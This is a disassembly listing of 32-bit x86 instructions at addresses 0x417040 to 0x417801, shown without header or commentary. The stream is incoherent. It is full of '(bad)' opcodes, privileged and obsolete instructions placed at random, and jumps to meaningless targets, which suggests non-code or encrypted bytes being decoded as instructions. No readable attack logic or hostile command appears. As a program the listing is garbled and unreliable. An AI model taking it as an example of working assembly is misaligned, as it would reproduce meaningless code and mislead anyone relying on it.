  417040:	stos   DWORD PTR es:[edi],eax
  417041:	(bad)  
  417042:	xor    edx,esp
  417044:	cmp    BYTE PTR [esi+0xddfb31c],0x64
  41704b:	int3   
  41704c:	data16 clc 
  41704e:	sub    edi,DWORD PTR [edi-0x6f]
  417051:	mov    WORD PTR ds:[eax+0x7af838a3],?
  417058:	mov    cl,0x6d
  41705a:	ins    DWORD PTR es:[edi],dx
  41705b:	adc    esp,ebp
  41705d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41705e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41705f:	pop    ecx
  417060:	and    BYTE PTR [ecx-0x2a],ch
  417063:	int3   
  417064:	jge    0x4170ae
  417066:	neg    BYTE PTR [edx+0x3e]
  417069:	pop    ebp
  41706a:	cwde   
  41706b:	pop    ebx
  41706c:	pop    ecx
  41706d:	pusha  
  41706e:	enter  0xd89e,0x4b
  417072:	(bad)  
  417073:	hlt    
  417074:	mov    cl,0x96
  417076:	outs   dx,BYTE PTR ds:[esi]
  417077:	xchg   ecx,eax
  417078:	test   al,0xc1
  41707a:	pop    edi
  41707b:	xchg   ebp,eax
  41707c:	sbb    bh,bh
  41707e:	in     al,dx
  41707f:	icebp  
  417080:	xchg   ecx,ebp
  417082:	pop    eax
  417083:	adc    eax,0xc78ffa03
  417088:	lods   al,BYTE PTR es:[esi]
  41708a:	dec    ebx
  41708b:	data16 add bl,BYTE PTR [edi-0x51]
  41708f:	dec    edx
  417090:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417091:	xor    al,0x2c
  417093:	in     eax,dx
  417094:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417095:	cmp    eax,DWORD PTR [esi+ebp*2+0x59b1de12]
  41709c:	dec    ebx
  41709d:	jne    0x417095
  41709f:	and    eax,0x587aa9d4
  4170a4:	jb     0x417052
  4170a6:	xchg   edi,eax
  4170a7:	hlt    
  4170a8:	cmp    BYTE PTR [ecx-0x33702013],ah
  4170ae:	(bad)  
  4170af:	push   0x32
  4170b1:	adc    bl,0xc1
  4170b4:	fst    QWORD PTR [esi]
  4170b6:	pushf  
  4170b7:	push   es
  4170b8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4170b9:	leave  
  4170ba:	jae    0x41712b
  4170bc:	inc    edi
  4170bd:	inc    edi
  4170be:	xor    ah,BYTE PTR [edi]
  4170c0:	sti    
  4170c1:	push   ecx
  4170c2:	fsub   DWORD PTR [edx]
  4170c4:	pop    ebp
  4170c5:	fidivr WORD PTR [esp+edx*1-0x25126883]
  4170cc:	retf   
  4170cd:	mov    DWORD PTR [edx],edi
  4170cf:	aam    0x4c
  4170d1:	(bad)  
  4170d2:	outs   dx,BYTE PTR ds:[esi]
  4170d3:	dec    eax
  4170d4:	lea    ebp,[edx-0x3]
  4170d7:	outs   dx,DWORD PTR ds:[esi]
  4170d8:	fidivr WORD PTR [esi-0x4d]
  4170db:	sbb    BYTE PTR [edx+0x6f],al
  4170de:	inc    edi
  4170df:	add    al,0x2a
  4170e1:	test   eax,0x88f3cad2
  4170e6:	inc    edi
  4170e8:	popf   
  4170e9:	sub    al,0xaf
  4170eb:	mov    ecx,0xc5550068
  4170f0:	popa   
  4170f1:	cmp    al,0x50
  4170f3:	stos   BYTE PTR es:[edi],al
  4170f4:	xchg   BYTE PTR [ebp-0xe76e5],bh
  4170fa:	and    DWORD PTR [ecx+ebx*2-0x63290c40],ebx
  417101:	je     0x417098
  417103:	neg    DWORD PTR [eax]
  417105:	(bad)  
  417106:	mov    ds:0xddf9f65e,al
  41710b:	and    bh,BYTE PTR [edi]
  41710d:	in     eax,0x1a
  41710f:	cmp    dl,ah
  417111:	test   eax,0x45a2d7b1
  417116:	aas    
  417117:	fcomip st,st(1)
  417119:	pop    esi
  41711a:	xlat   BYTE PTR ds:[ebx]
  41711b:	es fs pop ecx
  41711e:	adc    al,0xd0
  417120:	xor    al,0xc
  417122:	aaa    
  417123:	xor    BYTE PTR [edi-0x3fcc015],dl
  417129:	add    eax,0x615cf55c
  41712e:	(bad)  
  41712f:	sahf   
  417130:	std    
  417131:	cmp    edx,eax
  417133:	xor    dh,BYTE PTR [ecx]
  417135:	sub    eax,DWORD PTR [edx-0x5d]
  417138:	lahf   
  417139:	stc    
  41713a:	iret   
  41713b:	sar    BYTE PTR [edx+0x10],1
  41713e:	or     ch,BYTE PTR [edi+ebp*1]
  417141:	xchg   ebx,eax
  417142:	inc    ecx
  417143:	cmp    BYTE PTR [edi-0x2a325964],bl
  417149:	mov    ah,0xba
  41714b:	cmp    edx,DWORD PTR [ecx]
  41714d:	and    dh,bh
  41714f:	push   esi
  417150:	lea    esp,[ebp-0x5f0824e4]
  417156:	or     dl,BYTE PTR [ecx-0x37]
  417159:	jmp    0x9cf09b3a
  41715e:	inc    eax
  41715f:	inc    eax
  417160:	repnz mov al,0xbc
  417163:	pop    ss
  417164:	xchg   ebp,eax
  417165:	jecxz  0x4171a0
  417167:	xchg   bl,ah
  417169:	stos   BYTE PTR es:[edi],al
  41716a:	lods   al,BYTE PTR ds:[esi]
  41716b:	jle    0x417151
  41716d:	mov    edx,0xf2aef859
  417172:	inc    ecx
  417173:	inc    edx
  417174:	mov    DWORD PTR [edi+0x38a357ef],edx
  41717a:	and    al,0x1e
  41717c:	std    
  41717d:	(bad)  
  41717e:	scas   eax,DWORD PTR es:[edi]
  41717f:	repz popf 
  417181:	in     eax,0x4b
  417183:	dec    ebp
  417184:	inc    edi
  417185:	inc    edi
  417186:	push   ds
  417187:	mov    edx,0xaee23ee7
  41718c:	and    BYTE PTR [ebx+esi*1-0x40a75c9c],0x8
  417194:	je     0x41711c
  417196:	push   eax
  417197:	cmp    ah,cl
  417199:	daa    
  41719a:	pop    ds
  41719b:	outs   dx,BYTE PTR ds:[esi]
  41719c:	cs out dx,al
  41719e:	sub    BYTE PTR [edx-0x4],dl
  4171a1:	and    BYTE PTR [eax],al
  4171a3:	pop    di
  4171a5:	aad    0x2c
  4171a7:	sub    WORD PTR [edx+0x3b],cx
  4171ab:	in     eax,dx
  4171ac:	xor    BYTE PTR [edi-0x30663b61],0x65
  4171b3:	pop    ds
  4171b4:	ret    
  4171b5:	inc    ebx
  4171b6:	pushf  
  4171b7:	cld    
  4171b8:	fxch   st(5)
  4171ba:	retf   
  4171bb:	cwde   
  4171bc:	mov    WORD PTR [ebx-0x3e54db3b],gs
  4171c2:	pop    esi
  4171c3:	or     ch,dl
  4171c5:	sub    DWORD PTR [eax+0x2c7c02d4],edx
  4171cb:	std    
  4171cc:	jg     0x4171f4
  4171ce:	and    DWORD PTR [esp+eiz*4+0x74],ecx
  4171d2:	nop
  4171d3:	jmp    0xdcdf51b
  4171d8:	xchg   DWORD PTR [edx-0x4ecec97f],ecx
  4171de:	mov    cl,0x76
  4171e0:	fndisi(8087 only) 
  4171e2:	xchg   edi,eax
  4171e3:	pushf  
  4171e4:	adc    eax,0x106d88d6
  4171e9:	xor    ebx,DWORD PTR [eax+ebx*4]
  4171ec:	imul   eax,DWORD PTR [ebp+0x2c361439],0xe63d952b
  4171f6:	jmp    0x5ddb0701
  4171fb:	sbb    DWORD PTR ss:[edx-0x494bf7e4],ecx
  417202:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417203:	ins    DWORD PTR es:[edi],dx
  417204:	ror    DWORD PTR [ebx+0x152c0043],1
  41720a:	pop    esi
  41720b:	sub    cl,bl
  41720d:	sar    BYTE PTR [ecx],0x7d
  417210:	test   eax,0x49b0136a
  417215:	mov    eax,fs:0x8613ed82
  41721b:	lds    ecx,FWORD PTR ds:0xa08e7b21
  417221:	es pusha 
  417223:	pop    eax
  417224:	inc    eax
  417225:	jge    0x417232
  417227:	sahf   
  417228:	je     0x4171b5
  41722a:	and    eax,0xc6de735a
  41722f:	mov    eax,0x85be56d2
  417234:	mov    al,0x13
  417236:	ret    
  417237:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417238:	(bad)  
  41723a:	push   0xc4edd723
  41723f:	stos   BYTE PTR es:[edi],al
  417240:	loopne 0x4171f9
  417242:	xor    ebx,DWORD PTR [esi]
  417244:	sub    edx,DWORD PTR [eax]
  417246:	cld    
  417247:	adc    eax,0xc1f10f35
  41724c:	iret   
  41724d:	popf   
  41724e:	nop
  41724f:	(bad)
  417252:	addr16 dec esi
  417254:	or     edi,DWORD PTR [eax-0x2d]
  417257:	fwait
  417258:	jnp    0x41726e
  41725a:	adc    DWORD PTR [edx-0xbf3dd37],esp
  417260:	gs jmp 0x4b5f:0xee364632
  417268:	xchg   esi,eax
  417269:	add    BYTE PTR [esi+0x35],ah
  41726c:	dec    edx
  41726d:	je     0x417225
  41726f:	hlt    
  417270:	add    BYTE PTR [eax+edx*2-0x676597c7],al
  417277:	clc    
  417278:	xchg   DWORD PTR [edx+eax*8+0x45ad1bc7],ebp
  41727f:	outs   dx,DWORD PTR ds:[esi]
  417280:	leave  
  417281:	cmp    BYTE PTR [edi],dl
  417283:	push   ebp
  417284:	int    0xb7
  417286:	pop    edi
  417287:	push   ss
  417288:	push   edx
  417289:	(bad)  
  41728b:	out    dx,eax
  41728c:	ret    
  41728d:	mov    ds:0x238cdb10,al
  417292:	or     bl,BYTE PTR [edx+0x5c91e4]
  417298:	mov    esi,0x92433ed3
  41729d:	enter  0xfb14,0xc0
  4172a1:	xchg   ecx,esp
  4172a3:	aad    0xa2
  4172a5:	dec    ebp
  4172a6:	and    al,dh
  4172a8:	jge    0x41726f
  4172aa:	scas   al,BYTE PTR es:[edi]
  4172ab:	rol    BYTE PTR [ecx+0x5f],0x8d
  4172af:	dec    ebx
  4172b0:	mov    ebp,0xd7abb40f
  4172b5:	hlt    
  4172b6:	mov    al,ds:0xd77bab75
  4172bb:	fild   WORD PTR [eax]
  4172bd:	push   0x2196c1a9
  4172c2:	popf   
  4172c3:	add    eax,0x4181d993
  4172c8:	or     ecx,0xffffffb1
  4172cb:	add    eax,0x44a6f11b
  4172d0:	idiv   BYTE PTR [edi]
  4172d2:	add    al,0x6c
  4172d4:	dec    eax
  4172d5:	mov    ds:0x4bf8780e,eax
  4172da:	fcomp  QWORD PTR [edi]
  4172dc:	test   bh,cl
  4172de:	jmp    0x6d037d4
  4172e3:	inc    esp
  4172e4:	call   0x9d3a8822
  4172e9:	pop    ebp
  4172ea:	and    al,0x1d
  4172ec:	cmp    cl,cl
  4172ee:	push   0x9ce3bee6
  4172f3:	std    
  4172f4:	scas   al,BYTE PTR es:[edi]
  4172f5:	dec    eax
  4172f6:	adc    DWORD PTR [esi+0x3d],ecx
  4172f9:	(bad)  
  4172fa:	mov    eax,?
  4172fc:	pop    esi
  4172fd:	push   edi
  4172fe:	mov    edx,0xfd015f5d
  417303:	ficom  WORD PTR [ecx-0x50]
  417306:	mov    edx,0x70284bf2
  41730b:	mov    al,ds:0x52c37ede
  417310:	aam    0x79
  417312:	push   eax
  417313:	dec    ebx
  417314:	mov    ecx,DWORD PTR [ecx+ecx*4]
  417317:	int3   
  417318:	cmp    bh,0x39
  41731b:	pop    esp
  41731c:	frstor [ecx+ebx*2+0x5f]
  417320:	out    0xa0,eax
  417322:	in     eax,0x9c
  417324:	jb     0x417318
  417326:	xchg   edx,eax
  417327:	(bad)  
  417328:	das    
  417329:	xchg   DWORD PTR ds:0xf6cc5ba1,esp
  41732f:	xchg   ebp,eax
  417330:	pop    ds
  417331:	hlt    
  417332:	dec    edi
  417333:	inc    eax
  417334:	mov    dh,BYTE PTR [ebx-0x20]
  417337:	sahf   
  417338:	sbb    eax,ebx
  41733a:	dec    ecx
  41733b:	or     esp,esp
  41733d:	clc    
  41733e:	inc    BYTE PTR [esi]
  417340:	jne    0x41733b
  417342:	pop    esi
  417343:	mov    esp,gs
  417345:	push   edx
  417346:	pop    ds
  417347:	inc    ebx
  417348:	aam    0xb0
  41734a:	fist   WORD PTR [eax+0x3d]
  41734d:	stos   DWORD PTR es:[edi],eax
  41734e:	lods   eax,DWORD PTR ds:[esi]
  41734f:	jmp    0xfc5d:0x57d2fa6
  417356:	ds pushf 
  417358:	jae    0x41735e
  41735a:	jae    0x4173a6
  41735c:	wbinvd 
  41735e:	stos   BYTE PTR es:[edi],al
  41735f:	div    DWORD PTR [eax+0x57]
  417362:	push   eax
  417363:	add    BYTE PTR [esp-0x46dc1922],dh
  41736a:	cmp    edx,DWORD PTR [edi]
  41736c:	lahf   
  41736d:	adc    esp,DWORD PTR [eax-0x14]
  417370:	xchg   esi,eax
  417371:	mov    eax,gs
  417373:	or     bh,BYTE PTR [ebx-0x27cd878d]
  417379:	pushf  
  41737a:	mov    al,ds:0x6ab4988d
  41737f:	jmp    0xacdc:0xb0acc369
  417386:	cmp    al,0x72
  417388:	push   ss
  417389:	pop    ds
  41738a:	retf   0xbeb4
  41738d:	jle    0x4173eb
  41738f:	shr    DWORD PTR [ebp+ebx*4+0x5c],cl
  417393:	mov    ebp,0xdfe0486f
  417398:	(bad)  
  41739a:	or     al,0xeb
  41739c:	or     al,0x88
  41739e:	mov    edi,0x2162235f
  4173a3:	aaa    
  4173a4:	jbe    0x4173f1
  4173a6:	cmp    DWORD PTR [eax+0x44dd14aa],eax
  4173ac:	xchg   DWORD PTR ds:[eax+0x39356a9a],ebx
  4173b3:	adc    al,0x74
  4173b5:	cmp    BYTE PTR [esi],ah
  4173b7:	add    eax,0x24fe648e
  4173bc:	sub    al,0xf2
  4173be:	jb     0x4173dd
  4173c0:	daa    
  4173c1:	jnp    0x4173b1
  4173c3:	mov    dh,0xda
  4173c5:	addr16 or al,0xcf
  4173c8:	xor    BYTE PTR [eax-0x71f753ad],ch
  4173ce:	sub    dh,ah
  4173d0:	test   DWORD PTR ds:0xf3831a7c,edx
  4173d6:	jle    0x41744e
  4173d8:	into   
  4173d9:	adc    DWORD PTR [edi+0x31],0x2c95c27c
  4173e0:	sbb    ecx,DWORD PTR [eax]
  4173e2:	mov    BYTE PTR [ebp+0x68],ch
  4173e5:	rol    BYTE PTR [eax+ebx*8],cl
  4173e8:	add    BYTE PTR [esi-0x33],ah
  4173eb:	test   BYTE PTR [edi-0x68],dl
  4173ee:	sub    al,0x19
  4173f0:	mov    ?,WORD PTR [edi+0x68dcdcf9]
  4173f6:	ins    BYTE PTR es:[edi],dx
  4173f7:	or     ebp,esi
  4173f9:	stc    
  4173fa:	push   es
  4173fb:	dec    edx
  4173fc:	mov    esi,0xf35005ae
  417401:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417402:	xchg   esi,eax
  417403:	fisttp WORD PTR [ebx+0x25]
  417406:	push   esi
  417407:	popa   
  417408:	fnstenv [eax]
  41740a:	sub    ebp,edi
  41740c:	add    ecx,DWORD PTR [ebx+0x7755136f]
  417412:	pusha  
  417413:	or     bl,BYTE PTR ds:0x84f49766
  417419:	pop    ecx
  41741a:	test   eax,0x30523bbe
  41741f:	test   al,0x5f
  417421:	cwde   
  417422:	imul   esp,DWORD PTR ds:0xf38dd6ee,0xf7d0b97f
  41742c:	pop    es
  41742d:	cld    
  41742e:	xchg   ebp,eax
  41742f:	xor    BYTE PTR [eax+0x69734866],al
  417435:	cmc    
  417436:	jmp    0x3325b5a6
  41743b:	jns    0x4173de
  41743d:	push   0xd
  41743f:	push   ss
  417440:	inc    edx
  417441:	lea    ecx,[ecx-0x39c4923c]
  417447:	mov    ch,0x22
  417449:	fldcw  WORD PTR [ebx+0x2a]
  41744c:	call   0xee86:0x48e5d252
  417453:	sub    eax,0xc798b9d0
  417458:	adc    DWORD PTR [ecx-0x77bd27b7],0x7
  41745f:	sub    BYTE PTR [eax],0x7d
  417462:	add    al,0xea
  417464:	ret    0xe8e3
  417467:	cmp    eax,0xd3a9e036
  41746c:	push   edx
  41746d:	ret    
  41746e:	add    eax,0x5a45c90a
  417473:	int    0xf4
  417475:	shr    bh,1
  417477:	dec    ecx
  417478:	ds jp  0x41747f
  41747b:	shl    DWORD PTR [ebx+ebx*2],cl
  41747e:	dec    edi
  41747f:	in     al,0xe2
  417481:	stc    
  417482:	jnp    0x41740d
  417484:	retf   0x7331
  417487:	(bad)  
  417488:	(bad)  
  417489:	data16 jae 0x417464
  41748c:	dec    ecx
  41748d:	or     DWORD PTR [eax-0x54d02f5b],esi
  417493:	das    
  417494:	in     al,0x2f
  417496:	adc    ebx,edi
  417498:	bound  eax,QWORD PTR [edx]
  41749a:	add    BYTE PTR [eax],0xb5
  41749d:	add    BYTE PTR es:[edx-0x7e],dh
  4174a1:	scas   al,BYTE PTR es:[edi]
  4174a2:	push   cs
  4174a3:	iret   
  4174a4:	dec    ebp
  4174a5:	cmp    al,0x45
  4174a7:	pop    esi
  4174a8:	shl    esi,cl
  4174aa:	xor    al,0x2e
  4174ac:	aaa    
  4174ad:	aad    0xa2
  4174af:	int    0xd8
  4174b1:	sub    cl,cl
  4174b3:	pusha  
  4174b4:	and    cl,dl
  4174b6:	sub    bl,al
  4174b8:	scas   eax,DWORD PTR es:[edi]
  4174b9:	xchg   esp,eax
  4174ba:	fcomp  QWORD PTR [ecx-0x6d]
  4174bd:	in     eax,dx
  4174be:	rol    BYTE PTR [edx],0x73
  4174c1:	nop
  4174c2:	jo     0x4174f2
  4174c4:	and    BYTE PTR [edx],dl
  4174c6:	imul   edi,DWORD PTR [ebp-0x39],0xffffff95
  4174ca:	xchg   edi,eax
  4174cb:	or     al,0x4f
  4174cd:	daa    
  4174ce:	pop    edx
  4174cf:	(bad)  
  4174d0:	cmc    
  4174d1:	call   0x2cbe:0x305bdd2e
  4174d8:	scas   eax,DWORD PTR es:[edi]
  4174d9:	mov    ebp,cr2
  4174dc:	adc    BYTE PTR [esi],0xb6
  4174df:	lds    edx,FWORD PTR [edx+0x1ef29a7c]
  4174e5:	push   ebp
  4174e6:	mov    ch,0xbc
  4174e8:	sbb    ch,BYTE PTR ds:0xcc06e738
  4174ee:	mov    ebx,0x532c969f
  4174f3:	or     al,0x6e
  4174f5:	lods   al,BYTE PTR ds:[esi]
  4174f6:	jbe    0x41754d
  4174f8:	gs jp  0x4174dc
  4174fb:	test   BYTE PTR [ecx-0x18],al
  4174fe:	js     0x417579
  417500:	pop    eax
  417501:	jmp    0x417536
  417503:	in     eax,dx
  417504:	dec    edi
  417505:	imul   ebp,DWORD PTR [eax],0xffffffd9
  417508:	sub    dl,al
  41750a:	ss add eax,0x991906f3
  417510:	push   cs
  417511:	int    0xe6
  417513:	adc    BYTE PTR [ecx+0x29],dl
  417516:	inc    esp
  417517:	add    eax,DWORD PTR [eax-0xae79c7]
  41751d:	sub    cl,BYTE PTR [esi-0x30979059]
  417523:	jne    0x417533
  417525:	add    BYTE PTR [ebx+ebx*4-0x4794337a],ah
  41752c:	(bad)  
  41752d:	jnp    0x417576
  41752f:	add    al,0xa4
  417531:	jae    0x4174e6
  417533:	data16 clc 
  417535:	mov    dl,0x9e
  417537:	mov    ds:0x6a9d2861,eax
  41753c:	pop    esp
  41753d:	sbb    BYTE PTR [edx+ebp*2-0x3659fe90],bl
  417544:	fst    st(4)
  417546:	enter  0xaa1c,0x67
  41754a:	jnp    0x4175ab
  41754c:	xor    BYTE PTR [edx+0x54],0x3
  417550:	ds retf 0x8bf5
  417554:	cmp    al,0x71
  417556:	js     0x4174fc
  417558:	je     0x417512
  41755a:	pusha  
  41755b:	and    DWORD PTR [eax],esi
  41755d:	xchg   ecx,eax
  41755e:	inc    edi
  41755f:	js     0x4175a4
  417561:	stos   BYTE PTR es:[edi],al
  417562:	stc    
  417563:	sbb    eax,0xe4977db4
  417568:	mov    edi,0xdc02132e
  41756d:	repz and ch,BYTE PTR [edi]
  417570:	(bad)  
  417571:	inc    ebx
  417572:	dec    edx
  417573:	jo     0x4175bd
  417575:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417576:	adc    DWORD PTR [ebx],ebx
  417578:	es ss push ss
  41757b:	push   eax
  41757c:	adc    BYTE PTR [edx+0x26],dl
  41757f:	fwait
  417580:	pop    ecx
  417581:	ja     0x417538
  417583:	pop    edx
  417584:	xchg   ebx,eax
  417585:	xchg   bh,dl
  417587:	les    edi,FWORD PTR [esi+0x65]
  41758a:	or     al,BYTE PTR ds:0xce02b13f
  417590:	or     DWORD PTR [ebp-0x62d545f4],edx
  417596:	and    bh,BYTE PTR [ebp-0x46]
  417599:	ins    BYTE PTR es:[edi],dx
  41759a:	scas   al,BYTE PTR es:[edi]
  41759b:	jle    0x4175c9
  41759d:	jmp    0xaa987536
  4175a2:	cli    
  4175a3:	jmp    ecx
  4175a5:	mov    ebx,DWORD PTR [edx]
  4175a7:	sub    ebx,DWORD PTR [ebx-0x3366c303]
  4175ad:	jp     0x4175ce
  4175af:	push   es
  4175b0:	pop    edx
  4175b1:	push   ds
  4175b2:	xchg   esp,eax
  4175b3:	dec    edx
  4175b4:	sbb    ah,ch
  4175b6:	mov    esi,0x98972879
  4175bb:	mov    ebx,DWORD PTR [esi+0x375b8491]
  4175c1:	adc    DWORD PTR [ebp-0x30a4a839],esi
  4175c7:	push   ecx
  4175c8:	gs push 0x0
  4175cb:	ret    0x9037
  4175ce:	std    
  4175cf:	jmp    0x417594
  4175d1:	les    edx,FWORD PTR [edx-0x613308e7]
  4175d7:	aam    0x9b
  4175d9:	out    0x2a,eax
  4175db:	dec    ebx
  4175dc:	enter  0x6350,0x17
  4175e0:	cmp    eax,0xbd42c39a
  4175e5:	fs mov dl,0x18
  4175e8:	fdiv   DWORD PTR [ebp-0x57740f43]
  4175ee:	push   ebx
  4175ef:	cmp    ebp,edx
  4175f1:	call   DWORD PTR [edi]
  4175f3:	imul   edi,DWORD PTR [ebp+0x44],0xe5224497
  4175fa:	clc    
  4175fb:	sub    al,bl
  4175fd:	mov    bh,0xfb
  4175ff:	ret    0xd000
  417602:	fnstcw WORD PTR [edi]
  417604:	loopne 0x417677
  417606:	push   ss
  417607:	stos   BYTE PTR es:[edi],al
  417608:	push   ecx
  417609:	outs   dx,BYTE PTR ds:[esi]
  41760a:	pop    eax
  41760b:	mov    ecx,0xe2b89a4c
  417610:	xchg   esp,eax
  417611:	out    dx,eax
  417612:	or     edi,DWORD PTR [ebp+0x2eff1dac]
  417618:	cmp    ch,0xa
  41761b:	xchg   edx,eax
  41761c:	xchg   esp,eax
  41761d:	mov    bh,0xc6
  41761f:	inc    esi
  417620:	mov    ebx,0xc02f56
  417625:	in     eax,dx
  417626:	psubb  mm5,QWORD PTR [edx+0x21]
  41762a:	rcr    dh,1
  41762c:	dec    ebx
  41762d:	cld    
  41762e:	xchg   ebp,eax
  41762f:	outs   dx,BYTE PTR ds:[esi]
  417630:	(bad)  
  417632:	ins    BYTE PTR es:[edi],dx
  417633:	xor    eax,0x8c52d88
  417638:	in     al,dx
  417639:	and    ecx,DWORD PTR [edi-0x6c]
  41763c:	jns    0x4176a8
  41763e:	push   eax
  41763f:	jmp    0x58a37c21
  417644:	pop    esi
  417645:	inc    eax
  417646:	call   0x521cae51
  41764b:	mov    ds:0xe794ad89,al
  417650:	mov    eax,0x4557d2e7
  417655:	out    0xfa,eax
  417657:	jnp    0x4176ac
  417659:	inc    DWORD PTR [esi-0x73]
  41765c:	jl     0x417667
  41765e:	mov    bl,0x6
  417660:	(bad)  
  417661:	icebp  
  417662:	stos   BYTE PTR es:[edi],al
  417663:	test   eax,0x92de5dd3
  417668:	jnp    0x4176d6
  41766a:	int    0x60
  41766c:	xchg   ebp,eax
  41766d:	add    edi,esi
  41766f:	cdq    
  417670:	lock fwait
  417672:	pop    esi
  417673:	in     al,0xcb
  417675:	mov    eax,ds:0xf551d973
  41767a:	and    BYTE PTR [eax+ebp*1+0x33fcf190],al
  417681:	in     eax,dx
  417682:	and    al,0xa6
  417684:	fnstsw WORD PTR [edi+eiz*2]
  417687:	or     eax,DWORD PTR [esi]
  417689:	rcl    BYTE PTR [eax-0x3820ad6b],0xdf
  417690:	fdiv   QWORD PTR [edi+edx*1]
  417693:	mov    ah,0x3e
  417695:	pop    ebp
  417696:	js     0x417691
  417698:	mov    ebx,0xe1b72b7d
  41769d:	sub    al,0xf6
  41769f:	adc    cl,dh
  4176a1:	mov    DWORD PTR [eax+0x21],edi
  4176a4:	adc    al,0x1f
  4176a6:	mov    al,0x48
  4176a8:	adc    BYTE PTR [ebp-0x1c],dl
  4176ab:	sahf   
  4176ac:	dec    edi
  4176ad:	adc    ebp,DWORD PTR [eax-0x2e33855a]
  4176b3:	pop    eax
  4176b4:	fisub  DWORD PTR [ebx-0x37]
  4176b7:	mov    bh,0x1c
  4176b9:	popa   
  4176ba:	les    ecx,FWORD PTR [esi+eiz*4]
  4176bd:	stos   DWORD PTR es:[edi],eax
  4176be:	retf   
  4176bf:	fidiv  WORD PTR [ecx-0xf]
  4176c2:	and    ecx,DWORD PTR [ebx+0x337db95c]
  4176c8:	xchg   edi,eax
  4176c9:	mov    ebx,0x72f3dd89
  4176ce:	(bad)  
  4176cf:	adc    ebx,edx
  4176d1:	mov    ebp,0x25f997d2
  4176d6:	or     eax,0xd6a69269
  4176db:	in     al,dx
  4176dc:	sub    al,0x71
  4176de:	je     0x4176d4
  4176e0:	or     al,0x19
  4176e2:	in     eax,dx
  4176e3:	adc    eax,0x16bffa87
  4176e8:	ss icebp 
  4176ea:	xchg   ebx,eax
  4176eb:	sahf   
  4176ec:	shl    edx,1
  4176ee:	sub    al,bl
  4176f0:	shrd   DWORD PTR [ebp-0x2fc7ec5],esi,0x44
  4176f8:	or     dl,BYTE PTR [edx+0x33]
  4176fb:	cli    
  4176fc:	and    DWORD PTR [edi],ebp
  4176fe:	inc    esp
  4176ff:	xor    esp,DWORD PTR [ecx-0x709bbfea]
  417705:	sub    bh,BYTE PTR [ebp+0x32]
  417708:	out    dx,eax
  417709:	imul   esp,DWORD PTR [eax+0x2a87db0e],0x62993ab9
  417713:	sbb    esp,DWORD PTR [ebx]
  417715:	or     al,0xf0
  417717:	push   eax
  417719:	hlt    
  41771a:	mov    ebp,0x99a6530d
  41771f:	adc    ebp,edx
  417721:	mov    WORD PTR [esi],ss
  417723:	sbb    al,0x5
  417725:	cmp    dl,BYTE PTR [edx]
  417727:	ror    BYTE PTR [edx],cl
  417729:	push   ds
  41772a:	push   edx
  41772b:	inc    edx
  41772c:	outs   dx,DWORD PTR ds:[esi]
  41772d:	stc    
  41772e:	into   
  41772f:	cmp    eax,0x732d6d90
  417734:	push   0x9b353613
  417739:	or     eax,0x9f2be588
  41773e:	and    ebx,edi
  417740:	shl    BYTE PTR [ecx],cl
  417742:	jle    0x417760
  417744:	(bad)  
  417745:	scas   al,BYTE PTR es:[edi]
  417746:	das    
  417747:	xchg   ecx,eax
  417748:	dec    ecx
  417749:	fstp   QWORD PTR [edi]
  41774b:	sbb    eax,0x2addb296
  417750:	lods   al,BYTE PTR ds:[esi]
  417751:	nop
  417752:	cmc    
  417753:	xchg   edi,eax
  417754:	pop    ecx
  417755:	sbb    DWORD PTR [eax+0x1759bf1f],ebx
  41775b:	int3   
  41775c:	inc    ecx
  41775d:	sbb    esp,ecx
  41775f:	xchg   DWORD PTR [ecx-0xe],edi
  417762:	imul   edx,eax,0xffffffda
  417765:	or     edx,DWORD PTR [esi-0x5a]
  417768:	pop    ebx
  417769:	adc    dl,BYTE PTR [esi+0x72d7f037]
  41776f:	(bad)  
  417771:	mov    eax,ds:0xf0c6bb40
  417776:	pop    esi
  417777:	jmp    0x417706
  417779:	push   0xffffffb3
  41777b:	leave  
  41777c:	repnz and al,0x3a
  41777f:	sti    
  417780:	cwde   
  417781:	sahf   
  417782:	in     eax,0xd6
  417784:	adc    ebx,ebx
  417786:	popa   
  417787:	imul   edi,DWORD PTR [eax+ecx*2+0x575b68f3],0xffffffe9
  41778f:	inc    eax
  417790:	icebp  
  417791:	icebp  
  417792:	les    edi,FWORD PTR [edx+ebx*8+0x31]
  417796:	fiadd  WORD PTR [edx+0x21]
  417799:	cdq    
  41779a:	mov    WORD PTR [eax+esi*1+0x77],ss
  41779e:	adc    bl,BYTE PTR [edx]
  4177a0:	push   ebp
  4177a1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4177a2:	push   ebx
  4177a3:	or     DWORD PTR [ecx-0x4c],eax
  4177a6:	or     eax,0x83e0d04a
  4177ab:	lods   eax,DWORD PTR ds:[esi]
  4177ac:	jl     0x4177b8
  4177ae:	cmp    DWORD PTR [esi],0x6b05b6c5
  4177b4:	cwde   
  4177b5:	retf   
  4177b6:	fild   WORD PTR [si]
  4177b9:	sub    dl,BYTE PTR [edi]
  4177bb:	lock pushf 
  4177bd:	mov    BYTE PTR [esi+0x5af1ad9d],bl
  4177c3:	sub    BYTE PTR [esi-0x63693ee1],ah
  4177c9:	aas    
  4177ca:	loop   0x4177ae
  4177cc:	ret    0xbd4
  4177cf:	out    dx,eax
  4177d0:	sbb    eax,0xb137805b
  4177d5:	pop    edi
  4177d6:	dec    ebp
  4177d7:	adc    al,0xee
  4177d9:	xlat   BYTE PTR ds:[ebx]
  4177da:	mov    ebp,0x98ef9e86
  4177df:	pop    esp
  4177e0:	mov    eax,ds:0xbad72fcc
  4177e5:	xchg   edi,eax
  4177e6:	fwait
  4177e7:	sbb    al,0x51
  4177e9:	cwde   
  4177ea:	fwait
  4177eb:	xor    si,WORD PTR ds:0x90655607
  4177f2:	sbb    ch,bl
  4177f4:	stos   DWORD PTR es:[edi],eax
  4177f5:	ret    0x224
  4177f8:	das    
  4177f9:	das    
  4177fa:	(bad)  
  4177fb:	xchg   edx,eax
  4177fc:	pop    ecx
  4177fd:	cmc    
  4177fe:	and    al,0xc8
  417800:	ins    BYTE PTR es:[edi],dx
  417801:	lds    esi,FWORD PTR [edi]
